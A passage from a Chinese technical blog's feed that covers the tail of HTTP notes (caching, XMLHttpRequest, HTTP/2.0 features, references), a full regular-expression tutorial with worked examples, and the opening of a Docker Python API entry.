PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。</li><li>响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。</li><li>响应报文的 Cache-Control 首部字段没有指定不进行缓存。</li></ol><h2 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h2><p>为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：</p><blockquote><p>XMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。</p></blockquote><p>在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。而 GET 方法 Header 和 Data 会一起发送。</p><h1 id="九、HTTP-1-0-与-HTTP-1-1-的区别"><a href="#九、HTTP-1-0-与-HTTP-1-1-的区别" class="headerlink" title="九、HTTP/1.0 与 HTTP/1.1 的区别"></a>九、HTTP/1.0 与 HTTP/1.1 的区别</h1><ol><li>HTTP/1.1 默认是持久连接</li><li>HTTP/1.1 支持管线化处理</li><li>HTTP/1.1 支持虚拟主机</li><li>HTTP/1.1 新增状态码 100</li><li>HTTP/1.1 支持分块传输编码</li><li>HTTP/1.1 新增缓存处理指令 max-age</li></ol><p>具体内容见上文</p><h1 id="十、HTTP-2-0"><a href="#十、HTTP-2-0" class="headerlink" title="十、HTTP/2.0"></a>十、HTTP/2.0</h1><h2 id="HTTP-1-x-缺陷"><a href="#HTTP-1-x-缺陷" class="headerlink" title="HTTP/1.x 缺陷"></a>HTTP/1.x 缺陷</h2><p> HTTP/1.x 实现简单是以牺牲应用性能为代价的：</p><ul><li>客户端需要使用多个连接才能实现并发和缩短延迟；</li><li>不会压缩请求和响应标头，从而导致不必要的网络流量；</li><li>不支持有效的资源优先级，致使底层 TCP 连接的利用率低下。</li></ul><h2 id="二进制分帧层"><a href="#二进制分帧层" class="headerlink" title="二进制分帧层"></a>二进制分帧层</h2><p>HTTP/2.0 将报文分成 HEADERS 帧和 DATA 帧，它们都是二进制格式的。</p><p><div align="center"> <img src="/images/posts/86e6a91d-a285-447a-9345-c5484b8d0c47.png" width="400"> </div><br></p><p>在通信过程中，只会有一个 TCP 连接存在，它承载了任意数量的双向数据流（Stream）。一个数据流都有一个唯一标识符和可选的优先级信息，用于承载双向信息。消息（Message）是与逻辑请求或响应消息对应的完整的一系列帧。帧（Fram）是最小的通信单位，来自不同数据流的帧可以交错发送，然后再根据每个帧头的数据流标识符重新组装。</p><p><div align="center"> <img src="/images/posts/af198da1-2480-4043-b07f-a3b91a88b815.png" width="600"> </div><br></p><h2 id="服务端推送"><a href="#服务端推送" class="headerlink" title="服务端推送"></a>服务端推送</h2><p>HTTP/2.0 在客户端请求一个资源时，会把相关的资源一起发送给客户端，客户端就不需要再次发起请求了。例如客户端请求 page.html 页面，服务端就把 script.js 和 style.css 等与之相关的资源一起发给客户端。</p><p><div align="center"> <img src="/images/posts/e3f1657c-80fc-4dfa-9643-bf51abd201c6.png" width="800"> </div><br></p><h2 id="首部压缩"><a href="#首部压缩" class="headerlink" title="首部压缩"></a>首部压缩</h2><p>HTTP/1.1 的首部带有大量信息，而且每次都要重复发送。HTTP/2.0 要求客户端和服务器同时维护和更新一个包含之前见过的首部字段表，从而避免了重复传输。不仅如此，HTTP/2.0 也使用 Huffman 编码对首部字段进行压缩。</p><p><img src="/images/posts/u8F7D.png" alt="images"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>上野宣. 图解 HTTP[M]. 人民邮电出版社, 2014.</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP" target="_blank" rel="noopener">MDN : HTTP</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener">HTTP/2 简介</a></li><li><a href="http://php.net/manual/zh/function.htmlspecialchars.php" target="_blank" rel="noopener">htmlspecialchars</a></li><li><a href="https://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-using-prepared-callable-statement" target="_blank" rel="noopener">How to Fix SQL Injection Using Java PreparedStatement &amp; CallableStatement</a></li><li><a href="https://www.cnblogs.com/hyddd/archive/2009/03/31/1426026.html" target="_blank" rel="noopener">浅谈 HTTP 中 Get 与 Post 的区别</a><br><a href="https://github.com/CyC2018/Interview-Notebook/blob/master/notes/%E5%89%91%E6%8C%87%20offer%20%E9%A2%98%E8%A7%A3.md" target="_blank" rel="noopener">https://github.com/CyC2018/Interview-Notebook/blob/master/notes/%E5%89%91%E6%8C%87%20offer%20%E9%A2%98%E8%A7%A3.md</a></li><li><a href="https://www.webdancers.com/are-http-and-www-necesary/" target="_blank" rel="noopener">Are http:// and www really necessary?</a></li><li><a href="https://www.ntu.edu.sg/home/ehchua/programming/webprogramming/HTTP_Basics.html" target="_blank" rel="noopener">HTTP (HyperText Transfer Protocol)</a></li><li><a href="https://www.igvita.com/2011/12/01/web-vpn-secure-proxies-with-spdy-chrome/" target="_blank" rel="noopener">Web-VPN: Secure Proxies with SPDY &amp; Chrome</a></li><li><a href="http://en.wikipedia.org/wiki/File:HTTP_persistent_connection.svg" target="_blank" rel="noopener">File:HTTP persistent connection.svg</a></li><li><a href="https://en.wikipedia.org/wiki/Proxy_server" target="_blank" rel="noopener">Proxy server</a></li><li><a href="https://www.x-cart.com/blog/what-is-https-and-ssl.html" target="_blank" rel="noopener">What Is This HTTPS/SSL Thing And Why Should You Care?</a></li><li><a href="https://securebox.comodo.com/ssl-sniffing/ssl-offloading/" target="_blank" rel="noopener">What is SSL Offloading?</a></li><li><a href="https://docs.oracle.com/cd/E19424-01/820-4811/6ng8i26bn/index.html" target="_blank" rel="noopener">Sun Directory Server Enterprise Edition 7.0 Reference - Key Encryption</a></li><li><a href="https://www.codeproject.com/Articles/326574/An-Introduction-to-Mutual-SSL-Authentication" target="_blank" rel="noopener">An Introduction to Mutual SSL Authentication</a></li><li><a href="https://danielmiessler.com/study/url-uri/" target="_blank" rel="noopener">The Difference Between URLs and URIs</a></li><li><a href="https://juejin.im/entry/5766c29d6be3ff006a31b84e#comment" target="_blank" rel="noopener">Cookie 与 Session 的区别</a></li><li><a href="https://www.zhihu.com/question/19786827" target="_blank" rel="noopener">COOKIE 和 SESSION 有什么区别</a></li><li><a href="https://harttle.land/2015/08/10/cookie-session.html" target="_blank" rel="noopener">Cookie/Session 的机制与安全</a></li><li><a href="https://shijianan.com/2017/06/11/https/" target="_blank" rel="noopener">HTTPS 证书原理</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">维基百科：跨站脚本</a></li><li><a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：SQL 注入攻击</a></li><li><a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">维基百科：跨站点请求伪造</a></li><li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A" target="_blank" rel="noopener">维基百科：拒绝服务攻击</a></li><li><a href="https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn" target="_blank" rel="noopener">What is the difference between a URI, a URL and a URN?</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener">XMLHttpRequest</a></li><li><a href="https://blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/" target="_blank" rel="noopener">XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?</a></li><li><a href="https://www.ssl2buy.com/wiki/symmetric-vs-asymmetric-encryption-what-are-differences" target="_blank" rel="noopener">Symmetric vs. Asymmetric Encryption – What are differences?</a></li><li><a href="https://www.kancloud.cn/digest/web-performance-http2" target="_blank" rel="noopener">Web 性能优化与 HTTP/2</a></li><li><a href="https://developers.google.com/web/fundamentals/performance/http2/?hl=zh-cn" target="_blank" rel="noopener">HTTP/2 简介</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- GFM-TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一-基础概念&quot;&gt;一 、基础概念&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#web-基础&quot;&gt;Web 基础&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#url&quot;&gt;URL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a hre
      
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Http" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Http/"/>
    
    
      <category term="http" scheme="https://linux7788.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式</title>
    <link href="https://linux7788.com/linux_ops/regexr/"/>
    <id>https://linux7788.com/linux_ops/regexr/</id>
    <published>2018-05-18T10:38:25.000Z</published>
    <updated>2018-05-18T15:32:59.057Z</updated>
    
    <content type="html"><![CDATA[<!-- GFM-TOC --><ul><li><a href="#一概述">一、概述</a></li><li><a href="#二匹配单个字符">二、匹配单个字符</a></li><li><a href="#三匹配一组字符">三、匹配一组字符</a></li><li><a href="#四使用元字符">四、使用元字符</a></li><li><a href="#五重复匹配">五、重复匹配</a></li><li><a href="#六位置匹配">六、位置匹配</a></li><li><a href="#七使用子表达式">七、使用子表达式</a></li><li><a href="#八回溯引用">八、回溯引用</a></li><li><a href="#九前后查找">九、前后查找</a></li><li><a href="#十嵌入条件">十、嵌入条件</a></li><li><a href="#参考资料">参考资料</a><!-- GFM-TOC --></li></ul><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>正则表达式用于文本内容的查找和替换。</p><p>正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。</p><p><a href="https://regexr.com/" target="_blank" rel="noopener">正则表达式在线工具</a></p><h1 id="二、匹配单个字符"><a href="#二、匹配单个字符" class="headerlink" title="二、匹配单个字符"></a>二、匹配单个字符</h1><p>正则表达式一般是区分大小写的，但是也有些实现是不区分。</p><p><strong>.</strong>  可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；</p><p><strong>\</strong>  是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \ 进行转义，即在 . 前面加上 \ 。</p><p><strong>正则表达式</strong> </p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nam.</span><br></pre></td></tr></table></figure><p><strong>匹配结果</strong> </p><p>My  <strong>name</strong>  is Zheng.</p><h1 id="三、匹配一组字符"><a href="#三、匹配一组字符" class="headerlink" title="三、匹配一组字符"></a>三、匹配一组字符</h1><p><strong>[ ]</strong>  定义一个字符集合；</p><p>0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间只能用在 [ ] 之间。</p><p><strong>-</strong>  元字符只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符；</p><p><strong>^</strong>  是取非操作，必须在 [ ] 字符集合中使用；</p><p><strong>应用</strong> </p><p>匹配以 abc 为开头，并且最后一个字母不为数字的字符串：</p><p><strong>正则表达式</strong> </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc[^<span class="number">0</span><span class="number">-9</span>]</span><br></pre></td></tr></table></figure><p><strong>匹配结果</strong> </p><ol><li><strong>abcd</strong> </li><li>abc1</li><li>abc2</li></ol><h1 id="四、使用元字符"><a href="#四、使用元字符" class="headerlink" title="四、使用元字符"></a>四、使用元字符</h1><h2 id="匹配空白字符"><a href="#匹配空白字符" class="headerlink" title="匹配空白字符"></a>匹配空白字符</h2><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">[\b]</td><td style="text-align:center">回退（删除）一个字符</td></tr><tr><td style="text-align:center">\f</td><td style="text-align:center">换页符</td></tr><tr><td style="text-align:center">\n</td><td style="text-align:center">换行符</td></tr><tr><td style="text-align:center">\r</td><td style="text-align:center">回车符</td></tr><tr><td style="text-align:center">\t</td><td style="text-align:center">制表符</td></tr><tr><td style="text-align:center">\v</td><td style="text-align:center">垂直制表符</td></tr></tbody></table><p>\r\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \n ；\r\n\r\n 可以匹配 Windows 下的空白行，因为它将匹配两个连续的行尾标签，而这正是两条记录之间的空白行；</p><p>. 是元字符，前提是没有对它们进行转义；f 和 n 也是元字符，但是前提是对它们进行了转义。</p><h2 id="匹配特定的字符类别"><a href="#匹配特定的字符类别" class="headerlink" title="匹配特定的字符类别"></a>匹配特定的字符类别</h2><h3 id="1-数字元字符"><a href="#1-数字元字符" class="headerlink" title="1. 数字元字符"></a>1. 数字元字符</h3><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">\d</td><td style="text-align:center">数字字符，等价于 [0-9]</td></tr><tr><td style="text-align:center">\D</td><td style="text-align:center">非数字字符，等价于 [^0-9]</td></tr></tbody></table><h3 id="2-字母数字元字符"><a href="#2-字母数字元字符" class="headerlink" title="2. 字母数字元字符"></a>2. 字母数字元字符</h3><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">\w</td><td style="text-align:center">大小写字母，下划线和数字，等价于 [a-zA-Z0-9_]</td></tr><tr><td style="text-align:center">\W</td><td style="text-align:center">对 \w 取非</td></tr></tbody></table><h3 id="3-空白字符元字符"><a href="#3-空白字符元字符" class="headerlink" title="3. 空白字符元字符"></a>3. 空白字符元字符</h3><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">\s</td><td style="text-align:center">任何一个空白字符，等价于 [\f\n\r\t\v]</td></tr><tr><td style="text-align:center">\S</td><td style="text-align:center">对 \s 取非</td></tr></tbody></table><p>\x 匹配十六进制字符，\0 匹配八进制，例如 \x0A 对应 ASCII 字符 10 ，等价于 \n，也就是它会匹配 \n 。</p><h1 id="五、重复匹配"><a href="#五、重复匹配" class="headerlink" title="五、重复匹配"></a>五、重复匹配</h1><p><strong>+</strong>  匹配 1 个或者多个字符， <strong>*</strong> 匹配 0 个或者多个，<strong>?</strong> 匹配 0 个或者 1 个。</p><p><strong>应用</strong> </p><p>匹配邮箱地址。</p><p><strong>正则表达式</strong> </p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">\w</span>.]+@<span class="symbol">\w</span>+<span class="symbol">\.</span><span class="symbol">\w</span>+</span><br></pre></td></tr></table></figure><p>[\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符；</p><p><strong>匹配结果</strong> </p><p><strong>abc.def<span>@</span>qq.com</strong> </p><p>为了可读性，常常把转义的字符放到字符集合 [ ] 中，但是含义是相同的。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">\w</span>.]+@<span class="symbol">\w</span>+<span class="symbol">\.</span><span class="symbol">\w</span>+</span><br><span class="line">[<span class="symbol">\w</span>.]+@[<span class="symbol">\w</span>]+<span class="symbol">\.</span>[<span class="symbol">\w</span>]+</span><br></pre></td></tr></table></figure><p><strong>{n}</strong>  匹配 n 个字符，<strong>{m, n}</strong> 匹配 m~n 个字符，<strong>{m,}</strong> 至少匹配 m 个字符；</p><p>* 和 + 都是贪婪型元字符，会匹配最多的内容，在元字符后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m, n}? 。</p><p><strong>正则表达式</strong> </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>.+c</span><br></pre></td></tr></table></figure><p>由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。</p><p><strong>匹配结果</strong> </p><p><strong>abcabcabc</strong> </p><h1 id="六、位置匹配"><a href="#六、位置匹配" class="headerlink" title="六、位置匹配"></a>六、位置匹配</h1><h2 id="单词边界"><a href="#单词边界" class="headerlink" title="单词边界"></a>单词边界</h2><p><strong>\b</strong>  可以匹配一个单词的边界，边界是指位于 \w 和 \W 之间的位置；<strong>\B</strong> 匹配一个不是单词边界的位置。</p><p>\b 只匹配位置，不匹配字符，因此 \babc\b 匹配出来的结果为 3 个字符。</p><h2 id="字符串边界"><a href="#字符串边界" class="headerlink" title="字符串边界"></a>字符串边界</h2><p><strong>^</strong>  匹配整个字符串的开头，<strong>$</strong> 匹配结尾。</p><p>^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。</p><p>分行匹配模式（multiline）下，换行被当做字符串的边界。</p><p><strong>应用</strong> </p><p>匹配代码中以 // 开始的注释行</p><p><strong>正则表达式</strong> </p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^<span class="symbol">\s</span>*<span class="symbol">\/</span><span class="symbol">\/</span>.*$</span><br></pre></td></tr></table></figure><p><strong>匹配结果</strong> </p><ol><li>public void fun() {</li><li>&nbsp;&nbsp;&nbsp;&nbsp;     <strong>// 注释 1</strong> </li><li>&nbsp;&nbsp;&nbsp;&nbsp;    int a = 1;</li><li>&nbsp;&nbsp;&nbsp;&nbsp;    int b = 2;</li><li>&nbsp;&nbsp;&nbsp;&nbsp;     <strong>// 注释 2</strong> </li><li>&nbsp;&nbsp;&nbsp;&nbsp;    int c = a + b;</li><li>}</li></ol><h1 id="七、使用子表达式"><a href="#七、使用子表达式" class="headerlink" title="七、使用子表达式"></a>七、使用子表达式</h1><p>使用  <strong>( )</strong>  定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。</p><p>子表达式可以嵌套，但是嵌套层次过深会变得很难理解。</p><p><strong>正则表达式</strong> </p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="name">ab</span>)&#123;<span class="number">2</span>,&#125;</span><br></pre></td></tr></table></figure><p><strong>匹配结果</strong> </p><p><strong>ababab</strong> </p><p><strong>|</strong>  是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。</p><p><strong>正则表达式</strong> </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">19</span>|<span class="number">20</span>)\d&#123;<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>匹配结果</strong> </p><ol><li><strong>1900</strong> </li><li><strong>2010</strong> </li><li>1020</li></ol><p><strong>应用</strong> </p><p>匹配 IP 地址。IP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的：</p><ol><li>一位数字</li><li>不以 0 开头的两位数字</li><li>1 开头的三位数</li><li>2 开头，第 2 位是 0-4 的三位数</li><li>25 开头，第 3 位是 0-5 的三位数</li></ol><p><strong>正则表达式</strong> </p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>]|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|([<span class="number">1</span><span class="number">-9</span>]\d)|(\d))\.)&#123;<span class="number">3</span>&#125;(<span class="number">25</span>[<span class="number">0</span><span class="number">-5</span>]|(<span class="number">2</span>[<span class="number">0</span><span class="number">-4</span>]\d)|(<span class="number">1</span>\d&#123;<span class="number">2</span>&#125;)|([<span class="number">1</span><span class="number">-9</span>]\d)|(\d))</span><br></pre></td></tr></table></figure><p><strong>匹配结果</strong> </p><ol><li><strong>192.168.0.1</strong> </li><li>00.00.00.00</li><li>555.555.555.555</li></ol><h1 id="八、回溯引用"><a href="#八、回溯引用" class="headerlink" title="八、回溯引用"></a>八、回溯引用</h1><p>回溯引用使用  <strong>\n</strong>  来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。</p><p><strong>应用</strong> </p><p>匹配 HTML 中合法的标题元素。</p><p><strong>正则表达式</strong> </p><p>\1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;(h[<span class="number">1</span><span class="number">-6</span>])&gt;\w*?&lt;\/\<span class="number">1</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>匹配结果</strong> </p><ol><li><strong>&lt;h1&gt;x&lt;/h1&gt;</strong> </li><li><strong>&lt;h2&gt;x&lt;/h2&gt;</strong> </li><li>&lt;h3&gt;x&lt;/h1&gt;</li></ol><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><p>需要用到两个正则表达式。</p><p><strong>应用</strong> </p><p>修改电话号码格式。</p><p><strong>文本</strong> </p><p>313-555-1234</p><p><strong>查找正则表达式</strong> </p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\d&#123;<span class="number">3</span>&#125;)(<span class="name"><span class="builtin-name">-</span></span>)(\d&#123;<span class="number">3</span>&#125;)(<span class="name"><span class="builtin-name">-</span></span>)(\d&#123;<span class="number">4</span>&#125;)</span><br></pre></td></tr></table></figure><p><strong>替换正则表达式</strong> </p><p>在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">($</span><span class="bash">1) <span class="variable">$3</span>-<span class="variable">$5</span></span></span><br></pre></td></tr></table></figure><p><strong>结果</strong> </p><p>(313) 555-1234</p><h2 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h2><table><thead><tr><th style="text-align:center">元字符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">\l</td><td style="text-align:center">把下个字符转换为小写</td></tr><tr><td style="text-align:center">\u</td><td style="text-align:center">把下个字符转换为大写</td></tr><tr><td style="text-align:center">\L</td><td style="text-align:center">把\L 和\E 之间的字符全部转换为小写</td></tr><tr><td style="text-align:center">\U</td><td style="text-align:center">把\U 和\E 之间的字符全部转换为大写</td></tr><tr><td style="text-align:center">\E</td><td style="text-align:center">结束\L 或者\U</td></tr></tbody></table><p><strong>应用</strong> </p><p>把文本的第二个和第三个字符转换为大写。</p><p><strong>文本</strong> </p><p>abcd</p><p><strong>查找</strong> </p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\w)(\w&#123;<span class="number">2</span>&#125;)(\w)</span><br></pre></td></tr></table></figure><p><strong>替换</strong> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1\U<span class="variable">$2</span>\E<span class="variable">$3</span></span></span><br></pre></td></tr></table></figure><p><strong>结果</strong> </p><p>aBCd</p><h1 id="九、前后查找"><a href="#九、前后查找" class="headerlink" title="九、前后查找"></a>九、前后查找</h1><p>前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。向前查找用  <strong>?=</strong>  来定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?&lt;= 定义（注: javaScript 不支持向后匹配, java 对其支持也不完善）。</p><p><strong>应用</strong> </p><p>查找出邮件地址 @ 字符前面的部分。</p><p><strong>正则表达式</strong> </p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">\w+(?</span>=<span class="string">@)</span></span><br></pre></td></tr></table></figure><p><strong>结果</strong> </p><p><strong>abc</strong> @qq.com</p><p>对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。</p><h1 id="十、嵌入条件"><a href="#十、嵌入条件" class="headerlink" title="十、嵌入条件"></a>十、嵌入条件</h1><h2 id="回溯引用条件"><a href="#回溯引用条件" class="headerlink" title="回溯引用条件"></a>回溯引用条件</h2><p>条件判断为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。</p><p><strong>正则表达式</strong> </p><p>子表达式 (\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(\()?abc(<span class="name">?</span>(<span class="name">1</span>)\))</span><br></pre></td></tr></table></figure><p><strong>结果</strong> </p><ol><li><strong>(abc)</strong> </li><li><strong>abc</strong> </li><li>(abc</li></ol><h2 id="前后查找条件"><a href="#前后查找条件" class="headerlink" title="前后查找条件"></a>前后查找条件</h2><p>条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。</p><p><strong>正则表达式</strong> </p><p> ?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \d{5} ，才继续匹配 -\d{4} 。</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">d</span><span class="string">&#123;5&#125;</span></span>(?(?=-)-<span class="tag">\<span class="name">d</span><span class="string">&#123;4&#125;</span></span>)</span><br></pre></td></tr></table></figure><p><strong>结果</strong> </p><ol><li><strong>11111</strong> </li><li>22222-</li><li><strong>33333-4444</strong> </li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>BenForta. 正则表达式必知必会 [M]. 人民邮电出版社, 2007.</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- GFM-TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一概述&quot;&gt;一、概述&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#二匹配单个字符&quot;&gt;二、匹配单个字符&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#三匹配一组字符&quot;&gt;三、匹配一组字符&lt;/a&gt;&lt;/li&gt;
&lt;li
      
    
    </summary>
    
      <category term="编程技能" scheme="https://linux7788.com/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/"/>
    
      <category term="Regexr" scheme="https://linux7788.com/categories/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/Regexr/"/>
    
    
      <category term="ops" scheme="https://linux7788.com/tags/ops/"/>
    
      <category term="shell" scheme="https://linux7788.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>Docker Python Api 操作</title>
    <link href="https://linux7788.com/docker/docker_python-api/"/>
    <id>https://linux7788.com/docker/docker_python-api/</id>
    <published>2018-05-04T13:30:25.000Z</published>
    <updated>2018-05-18T15:32:58.975Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Docker-client-for-python"><a href="#Docker-client-for-python" class="headerlink" title="Docker-client for python"></a>Docker-client for python</h2><h3 id="简易安装"><a href="#简易安装" class="headerlink" title="简易安装"></a>简易安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-py</span><br></pre></td></tr></table></figure><h3 id="客户端初始化的三种方法"><a href="#客户端初始化的三种方法" class="headerlink" title="客户端初始化的三种方法"></a>客户端初始化的三种方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line">docker.api()</span><br><span class="line">docker.APIClient()</span><br><span class="line">docker.client()</span><br><span class="line">docker.DockerClient() <span class="comment">#其实也是docker.client()的一个子集</span></span><br><span class="line">docker.from_env() <span class="comment">#其实就是docker.client()的一个子集</span></span><br></pre></td></tr></table></figure><h3 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h3><h4 id="查看docker版本号"><a href="#查看docker版本号" class="headerlink" title="查看docker版本号"></a>查看docker版本号</h4><p>等同于执行<code>docker version</code>命令</p><figure class="highlight bash"><table><tr><td 